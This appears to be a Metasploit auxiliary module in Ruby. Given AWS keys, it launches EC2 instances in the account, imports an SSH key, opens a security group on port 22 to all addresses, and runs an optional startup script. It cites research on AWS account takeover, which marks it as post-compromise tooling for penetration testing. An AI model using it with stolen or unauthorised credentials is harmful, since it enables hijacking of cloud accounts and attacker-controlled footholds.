##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Auxiliary
  include Metasploit::Framework::Aws::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Launches Hosts in AWS",
        'Description'    => %q{
          This module will attempt to launch an AWS instances (hosts) in EC2.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Javier Godinez <godinezj[at]gmail.com>',
        ],
        'References'     => [
          [ 'URL', 'https://drive.google.com/open?id=0B2Ka7F_6TetSNFdfbkI1cnJHUTQ'],
          [ 'URL', 'https://published-prd.lanyonevents.com/published/rsaus17/sessionsFiles/4721/IDY-W10-DevSecOps-on-the-Offense-Automating-Amazon-Web-Services-Account-Takeover.pdf' ]
        ]
      )
    )
    register_options(
      [
        OptString.new('AccessKeyId', [true, 'AWS access key', '']),
        OptString.new('SecretAccessKey', [true, 'AWS secret key', '']),
        OptString.new('Token', [false, 'AWS session token', '']),
        OptString.new('RHOST', [true, 'AWS region specific EC2 endpoint', 'ec2.us-west-2.amazonaws.com']),
        OptString.new('Region', [true, 'The default region', 'us-west-2' ]),
        OptString.new("AMI_ID", [true, 'The Amazon Machine Image (AMI) ID', 'ami-1e299d7e']),
        OptString.new("KEY_NAME", [true, 'The SSH key to be used for ec2-user', 'admin']),
        OptString.new("SSH_PUB_KEY", [false, 'The public SSH key to be used for ec2-user, e.g., "ssh-rsa ABCDE..."', '']),
        OptString.new("USERDATA_FILE", [false, 'The script that will be executed on start', 'tools/modules/aws-aggregator-userdata.sh'])
      ]
    )
    register_advanced_options(
      [
        OptString.new('RPORT', [true, 'AWS EC2 Endpoint TCP Port', 443]),
        OptBool.new('SSL', [true, 'AWS EC2 Endpoint SSL', true]),
        OptString.new('INSTANCE_TYPE', [true, 'The instance type', 'm3.medium']),
        OptString.new('ROLE_NAME', [false, 'The instance profile/role name', '']),
        OptString.new('VPC_ID', [false, 'The EC2 VPC ID', '']),
        OptString.new('SUBNET_ID', [false, 'The public subnet to use', '']),
        OptString.new('SEC_GROUP_ID', [false, 'The EC2 security group to use', '']),
        OptString.new('SEC_GROUP_CIDR', [true, 'EC2 security group network access CIDR', '0.0.0.0/0']),
        OptString.new('SEC_GROUP_PORT', [true, 'EC2 security group network access PORT', 'tcp:22']),
        OptString.new('SEC_GROUP_NAME', [false, 'Optional EC2 security group name', '']),
        OptInt.new('MaxCount', [true, 'Maximum number of instances to launch', 1]),
        OptInt.new('MinCount', [true, 'Minumum number of instances to launch', 1])
      ]
    )
    deregister_options('VHOST')
  end

  def run
    if datastore['AccessKeyId'].blank? || datastore['SecretAccessKey'].blank?
      print_error("Both AccessKeyId and SecretAccessKey are required")
      return
    end
    # setup creds for making IAM API calls
    creds = {
      'AccessKeyId' => datastore['AccessKeyId'],
      'SecretAccessKey' => datastore['SecretAccessKey']
    }
    creds['Token'] = datastore['Token'] unless datastore['Token'].blank?

    create_keypair(creds) unless datastore['SSH_PUB_KEY'].blank?
    vpc = datastore['VPC_ID'].blank? ? vpc(creds) : datastore['VPC_ID']
    sg = datastore['SEC_GROUP_ID'].blank? ? create_sg(creds, vpc) : datastore['SEC_GROUP_ID']
    subnet = datastore['SUBNET_ID'].blank? ? pub_subnet(creds, vpc) : datastore['SUBNET_ID']
    unless subnet
      print_error("Could not find a public subnet, please provide one")
      return
    end
    instance_id = launch_instance(creds, subnet, sg)
    action = 'DescribeInstances'
    doc = call_ec2(creds, 'Action' => action, 'InstanceId.1' => instance_id)
    doc = print_results(doc, action)
    begin
      # need a better parser so we can avoid shit like this
      ip = doc['reservationSet']['item']['instancesSet']['item']['networkInterfaceSet']['item']['privateIpAddressesSet']['item']['association']['publicIp']
      print_status("Instance #{instance_id} has IP adrress #{ip}")
    rescue NoMethodError
      print_error("Could not retrieve instance IP address")
    end
  end

  def opts(action, subnet, sg)
    opts = {
      'Action' => action,
      'ImageId' => datastore['AMI_ID'],
      'KeyName' => datastore['KEY_NAME'],
      'InstanceType' => datastore['INSTANCE_TYPE'],
      'NetworkInterface.1.SubnetId' => subnet,
      'NetworkInterface.1.SecurityGroupId.1' => sg,
      'MinCount' => datastore['MinCount'].to_s,
      'MaxCount' => datastore['MaxCount'].to_s,
      'NetworkInterface.1.AssociatePublicIpAddress' => 'true',
      'NetworkInterface.1.DeviceIndex' => '0'
    }
    opts['IamInstanceProfile.Name'] = datastore['ROLE_NAME'] unless datastore['ROLE_NAME'].blank?
    unless datastore['USERDATA_FILE'].blank?
      if File.exist?(datastore['USERDATA_FILE'])
        opts['UserData'] = URI.encode(Base64.encode64(open(datastore['USERDATA_FILE'], 'r').read).strip)
      else
        print_error("Could not open userdata file: #{datastore['USERDATA_FILE']}")
      end
    end
    opts
  end

  def launch_instance(creds, subnet, sg)
    action = 'RunInstances'
    print_status("Launching instance(s) in #{datastore['Region']}, AMI: #{datastore['AMI_ID']}, key pair name: #{datastore['KEY_NAME']}, security group: #{sg}, subnet ID: #{subnet}")
    doc = call_ec2(creds, opts(action, subnet, sg))
    doc = print_results(doc, action)
    return if doc.nil?
    # TODO: account for multiple instances
    if doc['instancesSet']['item'].instance_of?(Array)
      instance_id = doc['instancesSet']['item'].first['instanceId']
    else
      instance_id = doc['instancesSet']['item']['instanceId']
    end
    print_status("Launched instance #{instance_id} in #{datastore['Region']} account #{doc['ownerId']}")
    action = 'DescribeInstanceStatus'
    loop do
      sleep(15)
      doc = call_ec2(creds, 'Action' => action, 'InstanceId' => instance_id)
      doc = print_results(doc, action)
      if doc ['instanceStatusSet'].nil?
        print_error("Error, could not get instance status, instance possibly terminated")
        break
      end
      status = doc['instanceStatusSet']['item']['systemStatus']['status']
      print_status("instance #{instance_id} status: #{status}")
      break if status == 'ok' || status != 'initializing'
    end
    instance_id
  end

  def create_keypair(creds)
    action = 'ImportKeyPair'
    doc = call_ec2(creds, 'Action' => action, 'KeyName' => datastore['KEY_NAME'], 'PublicKeyMaterial' => Rex::Text.encode_base64(datastore['SSH_PUB_KEY']))
    if doc['Response'].nil?
      doc = print_results(doc, action)
      if doc['keyName'].nil? || doc['keyFingerprint'].nil?
        print_error("Error creating key using privided key material (SSH_PUB_KEY)")
      else
        print_status("Created #{doc['keyName']} (#{doc['keyFingerprint']})")
      end
    else
      if doc['Response']['Errors'] && doc['Response']['Errors']['Error']
        print_error(doc['Response']['Errors']['Error']['Message'])
      else
        print_error("Error creating key using privided key material (SSH_PUB_KEY)")
      end
    end
  end

  def pub_subnet(creds, vpc_id)
    # First look for subnets that are configured to provision a public IP when instances are launched
    action = 'DescribeSubnets'
    doc = call_ec2(creds, 'Action' => action)
    doc = print_results(doc, action)
    vpc_subnets = doc['subnetSet']['item'].select { |x| x['vpcId'] == vpc_id }
    pub_subnets = vpc_subnets.select { |x| x['mapPublicIpOnLaunch'] == 'true' }
    return pub_subnets.first['subnetId'] if pub_subnets.count > 0

    # Second, try to retrieve public subnet id by looking through route tables to find subnets
    # associated with an Internet gateway
    action = 'DescribeRouteTables'
    doc = call_ec2(creds, 'Action' => action)
    doc = print_results(doc, action)
    vpc_route_table = doc['routeTableSet']['item'].select { |x| x['vpcId'] == vpc_id }
    vpc_route_table.each do |route_table|
      next if route_table['associationSet'].nil? || route_table['routeSet'].nil?
      entries = route_table['routeSet']['item']
      if entries.instance_of?(Hash)
        if entries['gatewayId'].start_with?('igw-')
          return route_table['associationSet']['item'].first['subnetId']
        end
      else
        route_table['routeSet']['item'].each do |route|
          if route['gatewayId'] && route['gatewayId'].start_with?('igw-')
            return route_table['associationSet']['item'].first['subnetId']
          end
        end
      end
    end
    nil
  end

  def create_sg(creds, vpc_id)
    name = Rex::Text.rand_text_alphanumeric(8)
    action = 'CreateSecurityGroup'
    doc = call_ec2(creds, 'Action' => action, 'GroupName' => name, 'VpcId' => vpc_id, 'GroupDescription' => name)
    doc = print_results(doc, action)
    print_error("Could not create SG") && return if doc['groupId'].nil?
    sg = doc['groupId']
    proto, port = datastore['SEC_GROUP_PORT'].split(':')
    cidr = URI.encode(datastore['SEC_GROUP_CIDR'])
    action = 'AuthorizeSecurityGroupIngress'
    doc = call_ec2(creds, 'Action' => action,
                          'IpPermissions.1.IpRanges.1.CidrIp' => cidr,
                          'IpPermissions.1.IpProtocol' => proto,
                          'IpPermissions.1.FromPort' => port,
                          'IpPermissions.1.ToPort' => port,
                          'GroupId' => sg)
    doc = print_results(doc, action)
    if doc['return'] && doc['return'] == 'true'
      print_status("Created security group: #{sg}")
    else
      print_error("Failed creating security group")
    end
    sg
  end

  def vpc(creds)
    action = 'DescribeVpcs'
    doc = call_ec2(creds, 'Action' => action)
    doc = print_results(doc, action)
    if doc['vpcSet'].nil? || doc['vpcSet']['item'].nil?
      print_error("Could not determine VPC ID for #{datastore['AccessKeyId']} in #{datastore['RHOST']}")
      return nil
    end
    item = doc['vpcSet']['item']
    return item['vpcId'] if item.instance_of?(Hash)
    return item.first['vpcId'] if item.instance_of?(Array) && !item.first['vpcId'].nil?
    print_error("Could not determine VPC ID for #{datastore['AccessKeyId']} in #{datastore['RHOST']}")
    nil
  end
end
